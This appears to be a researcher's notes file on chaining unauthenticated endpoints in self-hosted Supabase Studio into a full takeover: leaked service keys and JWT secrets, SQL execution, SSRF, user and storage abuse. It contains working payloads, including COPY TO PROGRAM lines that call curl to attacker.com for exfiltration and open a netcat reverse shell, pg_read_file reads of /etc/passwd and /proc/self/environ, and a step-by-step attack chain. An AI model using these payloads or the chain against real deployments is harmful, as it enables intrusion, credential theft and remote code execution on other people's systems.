# Supabase Self-Hosted Escalation Patterns

Discovered in June 2026 session. The auth bypass (CVSS 10.0) is just the start.
The real impact comes from chaining it with secret extraction, SQL execution, and SSRF.

## Pattern 1: Service Key Leak

**Endpoint**: `GET /api/v1/projects/default/api-keys`
**Handler**: Bare handler — no `apiWrapper()`, zero auth at all
**Returns**: Raw `SUPABASE_SERVICE_KEY` + `SUPABASE_ANON_KEY` in JSON

**Also**: `GET /api/platform/projects/default/settings` leaks `AUTH_JWT_SECRET`
(gated behind `apiWrapper` without `withAuth: true`)

**Impact**: Service key works from anywhere (not limited to localhost).
Can call `supabase.auth.admin.*`, PostgREST, Storage APIs directly.

## Pattern 2: SQL Execution → RCE

**Endpoint**: `POST /api/platform/pg-meta/default/query`
**Handler**: Uses `apiWrapper(req, res, handler, { withAuth: true })`
**Why it's vulnerable**: `IS_PLATFORM=false` skips auth even with `withAuth: true`
**User**: `supabase_admin` (default, has superuser privileges)

**RCE via COPY TO PROGRAM**:
```sql
COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/exfil';
COPY (SELECT '') TO PROGRAM 'nc attacker.com 4444 -e /bin/bash';
```

**RCE via extensions**:
```sql
CREATE EXTENSION IF NOT EXISTS plpython3u;
```

**File read**:
```sql
SELECT pg_read_file('/etc/passwd');
SELECT pg_read_file('/proc/self/environ');
```

## Pattern 3: SSRF to Internal Services

**Endpoint**: `POST /api/edge-functions/test`
**Handler**: Bare handler — no auth, not even `apiWrapper`
**Regex (self-hosted)**: `/^https?:\/\/[^\s\/?#]+\/functions\/v[0-9]{1}\/.*$/`
**Services reachable**: Kong:8000, GoTrue:9999, pg-meta:8080, Storage:5000,
Realtime:4000, Logflare:8080

## Pattern 4: REST/GraphQL Proxy (Full DB Access)

**Endpoints**: 
- `GET /api/platform/projects/default/api/rest` — PostgREST with service key
- `POST /api/platform/projects/default/api/graphql` — GraphQL with service key
- `POST /api/content/graphql` — Content API proxy (no auth)

## Pattern 5: User Management (Create/Delete/Ban)

**Endpoints**:
- `POST /api/platform/auth/default/users` — create admin user (no auth)
- `DELETE /api/platform/auth/default/users/{id}` — delete any user (no auth)
- `PATCH /api/platform/auth/default/users/{id}` — modify any user (no auth)
- `GET /api/platform/auth/default/users` — list all users (no auth)
- `POST /api/platform/auth/default/invite` — send invite emails (no auth)

## Pattern 6: Storage Operations (Data Exfiltration)

**Endpoints providing full CRUD (no auth)**:
- List/create/delete buckets
- List/upload/download/delete objects
- Generate signed URLs
- Empty buckets

## Complete Attack Chain

```
1. Network access → GET /api/v1/projects/default/api-keys
   [Extract SUPABASE_SERVICE_KEY directly]

2. OR → POST /api/platform/auth/default/users → create admin → login
   [Dashboard access]

3. Network access → POST /api/platform/pg-meta/default/query
   Body: {"query": "SELECT pg_read_file('/proc/self/environ')"}
   [Extract env vars — DB passwords, API keys, config]

4. Network access → POST /api/platform/pg-meta/default/query
   Body: {"query": "COPY (SELECT '') TO PROGRAM 'curl .../exfil'"}
   [Shell access on database container]

5. With service key: direct access to all services
   - PostgREST: any SQL on any table
   - GoTrue: create/manage any user
   - Storage: read/write/delete any file
   - Realtime: subscribe to all channels
```
